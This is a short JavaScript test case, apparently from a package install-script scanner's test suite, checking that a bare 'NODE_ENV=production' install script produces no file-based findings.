t.test('bare inline env assignment with only KEY=VALUE and no interpreter yields no results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'NODE_ENV=production' })
    t.notOk(result.some((f) => f.path !== null),
      'bare KEY=VALUE with no interpreter has no file-based results')
  })
})
